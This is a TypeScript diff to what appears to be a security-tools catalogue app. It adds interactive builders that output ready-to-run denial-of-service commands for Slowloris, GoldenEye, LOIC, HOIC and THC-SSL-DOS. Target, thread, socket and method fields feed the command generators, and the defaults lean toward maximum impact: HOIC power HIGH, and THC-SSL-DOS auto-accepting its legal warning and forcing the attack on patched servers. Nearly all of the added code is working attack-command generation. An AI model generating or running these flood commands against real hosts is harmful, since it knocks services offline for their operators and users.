@@ -42,17 +42,26 @@ export const denialOfServiceTools: Tool[] = [
     website: 'https://github.com/gkbrk/slowloris',
     interactiveCommands: [
       {
-        name: 'Slowloris Attack Builder',
-        description: 'Generate a custom Slowloris DoS command with precise socket and timing control.',
+        name: 'Slowloris HTTP Exhaustion Builder',
+        description: 'Generate advanced Slowloris DoS commands with precise socket, timing, and protocol controls.',
         inputs: [
-          { id: 'target', label: 'Target IP/Host', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Target IP or hostname' },
-          { id: 'port', label: 'Port', type: 'text', defaultValue: '80', placeholder: '80 or 443' },
-          { id: 'sockets', label: 'Number of Sockets', type: 'text', defaultValue: '150', placeholder: '150' },
-          { id: 'sleep', label: 'Sleep Interval (seconds)', type: 'text', defaultValue: '15', placeholder: '15' },
+          { id: 'target', label: 'Target Host/IP', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Target IP or hostname' },
+          { id: 'port', label: 'Port (-p)', type: 'text', defaultValue: '80', placeholder: 'Target port' },
+          { id: 'sockets', label: 'Sockets (-s)', type: 'text', defaultValue: '150', placeholder: 'Simultaneous connections' },
+          { id: 'sleeptime', label: 'Sleep Time (--sleeptime)', type: 'text', defaultValue: '15', placeholder: 'Seconds between headers' },
+          { id: 'https', label: 'Use HTTPS (--https)', type: 'checkbox', defaultValue: 'false', placeholder: 'Attack over SSL/TLS' },
+          { id: 'randomAgent', label: 'Random Agent (--randuseragent)', type: 'checkbox', defaultValue: 'true', placeholder: 'Randomize User-Agent' },
+          { id: 'verbose', label: 'Verbose Output (-v)', type: 'checkbox', defaultValue: 'true', placeholder: 'Show socket count in CLI' }
         ],
         generator: (inputs) => {
-          const https = inputs.port === '443' ? ' --https' : '';
-          return `slowloris ${inputs.target} -p ${inputs.port} -s ${inputs.sockets} --sleeptime ${inputs.sleep}${https} -v`;
+          let cmd = `slowloris ${inputs.target} -p ${inputs.port} -s ${inputs.sockets}`;
+          
+          if (inputs.sleeptime && inputs.sleeptime !== '15') cmd += ` --sleeptime ${inputs.sleeptime}`;
+          if (inputs.https === 'true') cmd += ' --https';
+          if (inputs.randomAgent === 'true') cmd += ' --randuseragent';
+          if (inputs.verbose === 'true') cmd += ' -v';
+          
+          return cmd;
         }
       }
     ]
@@ -91,6 +100,31 @@ export const denialOfServiceTools: Tool[] = [
     relatedTools: ['slowloris', 'loic', 'siege'],
     installation: 'git clone https://github.com/jseidl/GoldenEye.git',
     website: 'https://github.com/jseidl/GoldenEye',
+    interactiveCommands: [
+      {
+        name: 'GoldenEye Layer 7 Flooder',
+        description: 'Construct powerful GoldenEye HTTP POST/GET flood commands to stress test web servers.',
+        inputs: [
+          { id: 'target', label: 'Target URL', type: 'text', defaultValue: 'http://192.168.1.100/', placeholder: 'Must include http(s)://' },
+          { id: 'workers', label: 'Workers (-w)', type: 'text', defaultValue: '50', placeholder: 'Concurrent threads' },
+          { id: 'sockets', label: 'Sockets/Worker (-s)', type: 'text', defaultValue: '500', placeholder: 'Connections per thread' },
+          { id: 'method', label: 'HTTP Method (-m)', type: 'select', options: ['random', 'GET', 'POST'], defaultValue: 'random' },
+          { id: 'nossl', label: 'Disable SSL Check (-n)', type: 'checkbox', defaultValue: 'true', placeholder: 'Ignore certificate errors' },
+          { id: 'norandom', label: 'Disable Random URL (-d)', type: 'checkbox', defaultValue: 'false', placeholder: 'Static URL parameters only' }
+        ],
+        generator: (inputs) => {
+          let cmd = `python3 goldeneye.py ${inputs.target}`;
+          
+          if (inputs.workers && inputs.workers !== '10') cmd += ` -w ${inputs.workers}`;
+          if (inputs.sockets && inputs.sockets !== '500') cmd += ` -s ${inputs.sockets}`;
+          if (inputs.method !== 'random') cmd += ` -m ${inputs.method}`;
+          if (inputs.nossl === 'true') cmd += ' -n';
+          if (inputs.norandom === 'true') cmd += ' -d';
+          
+          return cmd;
+        }
+      }
+    ]
   },
   {
     id: 'loic',
@@ -124,6 +158,27 @@ export const denialOfServiceTools: Tool[] = [
     relatedTools: ['hoic', 'goldeneye', 'hping3'],
     installation: 'Windows: Download the binary from GitHub. Linux: Use Mono runtime.',
     website: 'https://github.com/NewEraCracker/LOIC',
+    interactiveCommands: [
+      {
+        name: 'LOIC CLI Automation',
+        description: 'Generate automated LOIC commands for CLI-based stress testing without the GUI.',
+        inputs: [
+          { id: 'runtime', label: 'Runtime Environment', type: 'select', options: ['Windows (LOIC.exe)', 'Linux/macOS (mono LOIC.exe)'], defaultValue: 'Linux/macOS (mono LOIC.exe)' },
+          { id: 'target', label: 'Target IP (/target)', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Target IP Address' },
+          { id: 'port', label: 'Port (/port)', type: 'text', defaultValue: '80', placeholder: 'Target Port' },
+          { id: 'method', label: 'Attack Method (/method)', type: 'select', options: ['TCP', 'UDP', 'HTTP'], defaultValue: 'UDP' },
+          { id: 'threads', label: 'Threads (/threads)', type: 'text', defaultValue: '100', placeholder: 'Number of attack threads' },
+          { id: 'wait', label: 'Wait for response (/wait)', type: 'checkbox', defaultValue: 'false', placeholder: 'Usually false for floods' }
+        ],
+        generator: (inputs) => {
+          let cmd = inputs.runtime === 'Windows (LOIC.exe)' ? 'LOIC.exe' : 'mono LOIC.exe';
+          
+          cmd += ` /target:${inputs.target} /port:${inputs.port} /method:${inputs.method} /threads:${inputs.threads} /wait:${inputs.wait}`;
+          
+          return cmd;
+        }
+      }
+    ]
   },
   {
     id: 'hoic',
@@ -155,6 +210,26 @@ export const denialOfServiceTools: Tool[] = [
     relatedTools: ['loic', 'goldeneye', 'slowloris'],
     installation: 'Windows only: Download binary. No Linux version available.',
     website: 'https://github.com/mehmet-offensive-security/HOIC',
+    interactiveCommands: [
+      {
+        name: 'HOIC Configuration Generator',
+        description: 'Generate parameters for running HOIC in high-volume denial of service tests.',
+        inputs: [
+          { id: 'executable', label: 'Executable', type: 'text', defaultValue: 'hoic.exe', placeholder: 'Path to hoic' },
+          { id: 'target', label: 'Target URL', type: 'text', defaultValue: 'http://192.168.1.100', placeholder: 'Target URL' },
+          { id: 'power', label: 'Power Level', type: 'select', options: ['LOW', 'MEDIUM', 'HIGH'], defaultValue: 'HIGH' },
+          { id: 'threads', label: 'Threads', type: 'text', defaultValue: '256', placeholder: 'Number of attack threads' },
+          { id: 'booster', label: 'Booster Script', type: 'text', defaultValue: 'GenericBoost.hoic', placeholder: 'Path to booster script' },
+          { id: 'delay', label: 'Delay', type: 'text', defaultValue: '0', placeholder: 'Wait time in milliseconds' }
+        ],
+        generator: (inputs) => {
+          // HOIC is largely GUI-based, but here we provide a generalized command abstraction
+          let cmd = `${inputs.executable}`;
+          cmd += ` [GUI NOTE: Target=${inputs.target}, Power=${inputs.power}, Threads=${inputs.threads}, Booster=${inputs.booster}]`;
+          return cmd;
+        }
+      }
+    ]
   },
   {
     id: 'thc-ssl-dos',
@@ -178,5 +253,29 @@ export const denialOfServiceTools: Tool[] = [
     relatedTools: ['slowloris', 'openssl'],
     installation: 'sudo apt install thc-ssl-dos -y',
     website: 'https://www.thc.org/thc-ssl-dos/',
+    interactiveCommands: [
+      {
+        name: 'THC-SSL-DOS Attack Builder',
+        description: 'Construct SSL/TLS renegotiation exhaustion attacks against target servers.',
+        inputs: [
+          { id: 'target', label: 'Target IP', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Target IP address' },
+          { id: 'port', label: 'Target Port', type: 'text', defaultValue: '443', placeholder: 'HTTPS port' },
+          { id: 'accept', label: 'Accept Legal (--accept)', type: 'checkbox', defaultValue: 'true', placeholder: 'Auto-accept legal warning' },
+          { id: 'disableCheck', label: 'Disable Reneg. Check (-d)', type: 'checkbox', defaultValue: 'true', placeholder: 'Force attack even if seemingly patched' },
+          { id: 'threads', label: 'Parallel Threads (-l)', type: 'text', defaultValue: '400', placeholder: 'Max 400 connections' },
+          { id: 'bindIp', label: 'Bind IP (-i)', type: 'text', defaultValue: '', placeholder: 'Local interface IP to bind to' }
+        ],
+        generator: (inputs) => {
+          let cmd = 'thc-ssl-dos';
+          
+          if (inputs.accept === 'true') cmd += ' --accept';
+          if (inputs.disableCheck === 'true') cmd += ' -d';
+          if (inputs.threads && inputs.threads !== '400') cmd += ` -l ${inputs.threads}`;
+          if (inputs.bindIp) cmd += ` -i ${inputs.bindIp}`;
+          
+          return `${cmd} ${inputs.target} ${inputs.port}`;
+        }
+      }
+    ]
   },
 ];
